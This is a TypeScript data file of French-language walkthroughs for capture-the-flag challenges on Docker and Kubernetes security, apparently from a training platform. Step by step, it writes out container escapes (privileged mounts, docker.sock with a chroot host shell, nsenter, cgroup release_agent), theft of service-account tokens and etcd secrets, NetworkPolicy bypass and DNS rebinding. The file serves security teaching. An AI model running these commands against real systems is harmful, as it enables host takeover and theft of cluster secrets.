import { ChallengeGuide } from '../guides';

export const guides: Record<string, ChallengeGuide> = {
  '4.1.1': {
    context: "Le conteneur cible fonctionne avec l'option `--privileged`, lui donnant accès à presque toutes les fonctionnalités de l'hôte, y compris la possibilité de monter des disques.",
    objective: "Échapper au conteneur privilégié pour accéder au système de fichiers de la machine hôte et récupérer le flag.",
    concepts: ["Docker", "Privileged Container", "Mount", "Container Escape"],
    steps: [
      {
        title: "Vérification des privilèges",
        command: "fdisk -l",
        detail: "La commande `fdisk -l` permet de lister les disques de la machine hôte. Si elle réussit, cela confirme que le conteneur est privilégié et a accès aux périphériques de l'hôte (ex: `/dev/sda1` ou `/dev/vda1`)."
      },
      {
        title: "Création d'un point de montage",
        command: "mkdir /mnt/host",
        detail: "Créez un dossier qui servira de point de montage pour le disque de l'hôte."
      },
      {
        title: "Montage du système de fichiers de l'hôte",
        command: "mount /dev/vda1 /mnt/host",
        detail: "Montez la partition principale de l'hôte (cela peut être `/dev/sda1` selon le système) dans le dossier `/mnt/host`. Vous avez maintenant accès aux fichiers de l'hôte."
      },
      {
        title: "Récupération du flag",
        command: "cat /mnt/host/root/flag.txt",
        detail: "Cherchez le flag sur le système de l'hôte. Souvent, il se trouve dans le dossier `/root`. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.1.2': {
    context: "Le socket Docker de la machine hôte (`/var/run/docker.sock`) est monté à l'intérieur du conteneur. Cela permet au conteneur de communiquer avec le daemon Docker de l'hôte.",
    objective: "Exploiter le montage du socket Docker pour créer un nouveau conteneur privilégié et s'évader.",
    concepts: ["Docker Socket", "RCE", "Privilege Escalation", "Container Escape"],
    steps: [
      {
        title: "Vérification de la présence du socket",
        command: "ls -la /var/run/docker.sock",
        detail: "Vérifiez que le fichier `docker.sock` est bien présent et accessible dans le conteneur."
      },
      {
        title: "Installation du client Docker (si nécessaire)",
        command: "apt-get update && apt-get install -y docker.io",
        detail: "Installez le client Docker pour pouvoir interagir facilement avec le socket."
      },
      {
        title: "Lancement d'un conteneur d'évasion",
        command: "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash",
        detail: "Cette commande demande au daemon de l'hôte de lancer un nouveau conteneur, en montant la racine de l'hôte `/` dans `/host`, et d'exécuter un shell via `chroot`. Vous êtes maintenant root sur l'hôte !"
      },
      {
        title: "Lecture du flag",
        command: "cat /root/flag.txt",
        detail: "Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.1.3': {
    context: "Certains conteneurs mal configurés peuvent partager des namespaces (comme le namespace mount ou PID) avec l'hôte, permettant d'accéder aux processus et au système de fichiers de l'hôte.",
    objective: "Utiliser `nsenter` pour s'échapper du conteneur en rejoignant les namespaces de l'hôte.",
    concepts: ["Namespaces", "nsenter", "Container Breakout", "Linux Capabilities"],
    steps: [
      {
        title: "Recherche du PID 1 de l'hôte",
        command: "ps aux",
        detail: "Si le namespace PID est partagé, vous verrez les processus de l'hôte, y compris le PID 1 (généralement `init` ou `systemd`)."
      },
      {
        title: "Évasion avec nsenter",
        command: "nsenter -t 1 -m -u -n -i sh",
        detail: "La commande `nsenter` permet d'exécuter un programme dans les namespaces d'un autre processus. Ici, on rejoint les namespaces mount, UTS, network et IPC du PID 1. On obtient ainsi un shell sur l'hôte."
      },
      {
        title: "Récupération du flag",
        command: "cat /root/flag.txt",
        detail: "Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.1.4': {
    context: "De nombreuses images Docker contiennent des secrets codés en dur qui ont été ajoutés lors de la construction (build) de l'image, puis supprimés dans une couche ultérieure.",
    objective: "Analyser les couches (layers) de l'image Docker pour extraire des secrets cachés.",
    concepts: ["Docker Image Layers", "Secret Scanning", "Dive", "History"],
    steps: [
      {
        title: "Analyse de l'historique de l'image",
        command: "docker history <image_name>",
        detail: "Examinez les commandes utilisées pour construire l'image. Recherchez des copies de fichiers de configuration ou de clés."
      },
      {
        title: "Extraction de l'image",
        command: "docker save <image_name> -o image.tar && tar -xf image.tar",
        detail: "Sauvegardez l'image dans un fichier tar et extrayez-la pour explorer manuellement les couches."
      },
      {
        title: "Recherche de secrets dans les couches",
        command: "grep -r 'PCE{' .",
        detail: "Fouillez dans les dossiers extraits pour trouver les fichiers supprimés dans les dernières couches. Vous trouverez le flag caché dans l'un des fichiers de l'historique. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.2.1': {
    context: "L'autorisation dans Kubernetes utilise RBAC (Role-Based Access Control). Un ClusterRoleBinding permet de lier un rôle à un utilisateur ou service account au niveau du cluster entier. Ici, un compte possède trop de permissions.",
    objective: "Exploiter un ClusterRoleBinding trop permissif pour obtenir un accès d'administrateur (cluster-admin).",
    concepts: ["Kubernetes", "RBAC", "ClusterRoleBinding", "Privilege Escalation"],
    steps: [
      {
        title: "Vérification de vos permissions",
        command: "kubectl auth can-i --list",
        detail: "Lister toutes les actions que vous êtes autorisé à effectuer. Remarquez que vous avez des droits inattendus, potentiellement liés à `cluster-admin`."
      },
      {
        title: "Recherche du ClusterRoleBinding fautif",
        command: "kubectl get clusterrolebindings -o custom-columns=NAME:.metadata.name,ROLE:.roleRef.name",
        detail: "Analysez les liaisons de rôles pour identifier quel ClusterRoleBinding accorde les droits excessifs à votre ServiceAccount."
      },
      {
        title: "Abus des permissions (ex: lister les secrets)",
        command: "kubectl get secrets -n kube-system",
        detail: "Puisque vous avez les droits `cluster-admin`, vous pouvez lire tous les secrets de tous les namespaces, y compris le flag. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.2.2': {
    context: "Le Kubernetes Dashboard est une interface web pour gérer le cluster. Parfois, il est exposé sans authentification ou avec des droits `cluster-admin` par défaut.",
    objective: "Accéder au Dashboard Kubernetes exposé sans authentification et extraire les informations sensibles.",
    concepts: ["Kubernetes Dashboard", "Misconfiguration", "Unauthenticated Access"],
    steps: [
      {
        title: "Découverte du service Dashboard",
        command: "kubectl get svc -n kubernetes-dashboard",
        detail: "Identifiez l'IP ou le NodePort sur lequel le Dashboard est exposé."
      },
      {
        title: "Accès à l'interface Web",
        command: "curl -k https://<node_ip>:<node_port>/",
        detail: "Accédez à l'URL du dashboard via un navigateur ou avec `curl`. Remarquez que l'interface ne demande pas de token ou permet de 'Skip' l'authentification."
      },
      {
        title: "Recherche du flag",
        command: "kubectl get secrets -n default",
        detail: "Naviguez dans l'interface ou utilisez les permissions accordées au Dashboard pour lire le flag dans les secrets. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.2.3': {
    context: "Etcd est la base de données clé-valeur qui stocke l'état complet du cluster Kubernetes, y compris tous les secrets. Si etcd n'est pas chiffré au repos ou est accessible sans authentification mutuelle forte, les secrets peuvent être compromis.",
    objective: "Se connecter à la base de données etcd et extraire les secrets stockés en clair.",
    concepts: ["Kubernetes", "etcd", "Secrets", "Encryption at Rest"],
    steps: [
      {
        title: "Installation de etcdctl",
        command: "apt-get install -y etcd-client",
        detail: "L'outil `etcdctl` permet d'interagir avec le serveur etcd."
      },
      {
        title: "Interrogation de la base etcd",
        command: "ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_ip>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get / --prefix --keys-only",
        detail: "Affichez toutes les clés stockées dans etcd. Cherchez les clés contenant `/registry/secrets/`."
      },
      {
        title: "Lecture du secret contenant le flag",
        command: "ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_ip>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get /registry/secrets/default/flag-secret",
        detail: "Lisez la valeur brute du secret dans etcd. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.2.4': {
    context: "Un Service Account (SA) est associé à chaque Pod. Si le token de ce SA est automatiquement monté dans le conteneur et que le SA dispose de privilèges élevés, il peut être utilisé pour attaquer le cluster.",
    objective: "Extraire le token du Service Account monté dans le Pod et l'utiliser pour escalader ses privilèges sur l'API Kubernetes.",
    concepts: ["Service Account", "Token Abuse", "Kubernetes API", "Privilege Escalation"],
    steps: [
      {
        title: "Localisation du token",
        command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        detail: "Affichez le token JWT du Service Account qui a été monté dans le système de fichiers du Pod."
      },
      {
        title: "Découverte des permissions (avec curl)",
        command: "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{\"spec\":{}}' -H \"Content-Type: application/json\"",
        detail: "Utilisez le token pour interroger l'API Kubernetes et lister vos droits (équivalent de `auth can-i --list`)."
      },
      {
        title: "Lecture des secrets",
        command: "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        detail: "Le SA a les droits de lire les secrets. Utilisez l'API pour récupérer le flag. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.3.1': {
    context: "Les NetworkPolicies dans Kubernetes agissent comme un pare-feu interne, contrôlant le trafic entre les Pods. Une mauvaise configuration peut laisser des brèches permettant à un attaquant de pivoter entre des namespaces isolés.",
    objective: "Contourner une NetworkPolicy pour accéder à un service restreint dans un autre namespace.",
    concepts: ["NetworkPolicy", "Lateral Movement", "Namespace Isolation"],
    steps: [
      {
        title: "Analyse réseau locale",
        command: "nmap -p- <target_ip>",
        detail: "Tentez de scanner la cible depuis votre pod actuel. Si cela échoue, c'est qu'une NetworkPolicy bloque le trafic."
      },
      {
        title: "Recherche de labels autorisés",
        command: "kubectl get networkpolicies -A -o yaml",
        detail: "Si vous avez les droits de lecture, analysez les règles. Il y a souvent une faille qui autorise le trafic venant d'un certain `podSelector` ou `namespaceSelector` (ex: label `role=frontend`)."
      },
      {
        title: "Ajout du label pour bypass",
        command: "kubectl label pod my-pod role=frontend",
        detail: "Appliquez le label requis à votre pod pour être autorisé par la NetworkPolicy. Vous pouvez maintenant accéder au service cible."
      },
      {
        title: "Récupération du flag",
        command: "curl http://<target_ip>:<target_port>/flag",
        detail: "Requêtez le service cible maintenant que la connexion est permise. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.3.2': {
    context: "Un Ingress Controller gère le routage HTTP/HTTPS entrant vers les services du cluster. Une mauvaise configuration des règles de routage ou l'utilisation d'annotations dangereuses (ex: nginx-ingress snippets) peut exposer des services internes.",
    objective: "Exploiter une mauvaise configuration de l'Ingress pour accéder à un service interne qui ne devrait pas être exposé.",
    concepts: ["Ingress Controller", "Misconfiguration", "SSRF", "Nginx Snippets"],
    steps: [
      {
        title: "Analyse des règles Ingress",
        command: "kubectl get ingress -A -o yaml",
        detail: "Vérifiez les règles d'Ingress configurées. Cherchez des annotations comme `nginx.ingress.kubernetes.io/configuration-snippet` ou des règles de chemins trop permissives."
      },
      {
        title: "Exploitation du routage",
        command: "curl -H \"Host: internal-service.local\" http://<ingress_ip>/",
        detail: "Modifiez vos requêtes HTTP (ex: en-tête Host, chemins avec traversée) pour forcer l'Ingress à router votre trafic vers le service interne visé."
      },
      {
        title: "Extraction du flag",
        command: "curl http://<ingress_ip>/internal-flag-endpoint",
        detail: "Une fois le contournement réussi, accédez au endpoint contenant le flag. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.3.3': {
    context: "Le DNS Rebinding est une attaque où un domaine change rapidement son IP d'une IP publique vers une IP interne (ex: 127.0.0.1 ou l'IP d'un Pod) pour contourner la Same-Origin Policy. Dans K8s, cela permet d'attaquer l'API locale ou les services cloud-metadata.",
    objective: "Utiliser une attaque par DNS rebinding pour accéder à l'API interne ou récupérer un secret.",
    concepts: ["DNS Rebinding", "SSRF", "Kubernetes Networking"],
    steps: [
      {
        title: "Préparation de l'attaque DNS",
        command: "echo 'A <domaine> <ip_publique> (TTL court)'",
        detail: "Configurez un serveur DNS (ou utilisez un service en ligne) pour répondre avec l'IP publique de votre serveur malveillant, puis rapidement avec l'IP interne du service cible (ex: l'IP du kube-api local)."
      },
      {
        title: "Exécution du payload",
        command: "curl http://<domaine_malveillant>/",
        detail: "Faites visiter ce domaine à un bot/service vulnérable dans le cluster. La première résolution DNS lui fait charger votre payload JavaScript. La seconde résolution (rebinding) pointe vers la cible interne."
      },
      {
        title: "Extraction des données",
        command: "cat exfiltrated_data.txt",
        detail: "Le script exécute une requête vers la cible interne et vous renvoie les données (ex: le flag). Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.4.1': {
    context: "L'exécution de conteneurs en tant qu'utilisateur `root` (UID 0) est une mauvaise pratique. Si une vulnérabilité applicative est exploitée, l'attaquant a directement les droits root dans le conteneur.",
    objective: "Identifier les Pods exécutés en root et comprendre comment utiliser cette mauvaise pratique avec un volume monté pour compromettre le système.",
    concepts: ["Pod Security", "RunAsRoot", "Security Context"],
    steps: [
      {
        title: "Audit des Pods",
        command: "kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.containers[0].securityContext.runAsUser}{\"\\n\"}{end}'",
        detail: "Vérifiez quels Pods sont configurés pour s'exécuter en tant qu'utilisateur root (runAsUser non défini ou défini à 0)."
      },
      {
        title: "Accès au conteneur root",
        command: "kubectl exec -it <pod_name> -- sh",
        detail: "Ouvrez un shell dans le Pod vulnérable et confirmez vos privilèges avec la commande `id`."
      },
      {
        title: "Lecture du flag",
        command: "cat /root/flag.txt",
        detail: "Grâce à vos droits root dans le conteneur, lisez le fichier contenant le flag. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.4.2': {
    context: "Les Capabilities Linux divisent les privilèges de l'utilisateur root. Accorder la capability `SYS_ADMIN` à un conteneur (qui est presque équivalent à `--privileged`) ou la capability `SYS_MODULE` permet d'exécuter des actions très dangereuses.",
    objective: "Exploiter un Pod ayant la capability `CAP_SYS_ADMIN` pour monter des fichiers et s'échapper.",
    concepts: ["Linux Capabilities", "CAP_SYS_ADMIN", "Container Escape"],
    steps: [
      {
        title: "Vérification des capabilities",
        command: "capsh --print",
        detail: "Vérifiez si la capability `cap_sys_admin` est présente dans la liste des Current capabilities du conteneur."
      },
      {
        title: "Évasion (ex: via cgroups release_agent)",
        command: "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
        detail: "Si vous avez `SYS_ADMIN`, vous pouvez créer un nouveau cgroup et utiliser la fonctionnalité `release_agent` pour forcer le kernel de l'hôte à exécuter un script en tant que root système."
      },
      {
        title: "Récupération du flag",
        command: "echo '#!/bin/sh' > /cmd ; echo 'cat /flag > /tmp/output' >> /cmd ; chmod a+x /cmd",
        detail: "Le script sera exécuté par le noyau. Vous récupérerez la sortie dans `/tmp/output`. Le flag attendu est **PCE{...}**."
      }
    ]
  },
  '4.4.3': {
    context: "Les Admission Controllers et les PodSecurityPolicies (ou Pod Security Admission) sont utilisés pour restreindre la création de Pods non sécurisés (ex: empêcher le lancement en root).",
    objective: "Trouver un moyen de contourner un contrôleur d'admission ou un PSP mal configuré pour créer un pod privilégié et lire le flag.",
    concepts: ["Admission Controller", "PodSecurityPolicy", "Bypass", "RBAC"],
    steps: [
      {
        title: "Analyse des restrictions",
        command: "kubectl get psp",
        detail: "Listez les politiques en place pour voir ce qui est autorisé ou non (ex: les privilèges hostNetwork, hostPID, RunAsUser)."
      },
      {
        title: "Recherche de failles dans la politique",
        command: "kubectl auth can-i use psp/<privileged_psp_name>",
        detail: "Vérifiez si votre ServiceAccount a le droit d'utiliser une politique plus permissive (souvent lié par un RoleBinding caché ou mal configuré)."
      },
      {
        title: "Création du Pod exploit",
        command: "kubectl apply -f bad-pod.yaml",
        detail: "Créez un pod qui utilise les permissions de la PSP permissive pour monter le dossier `/root` de l'hôte."
      },
      {
        title: "Lecture du flag",
        command: "kubectl exec -it <bad_pod> -- cat /host-root/flag.txt",
        detail: "Le flag attendu est **PCE{...}**."
      }
    ]
  }
};
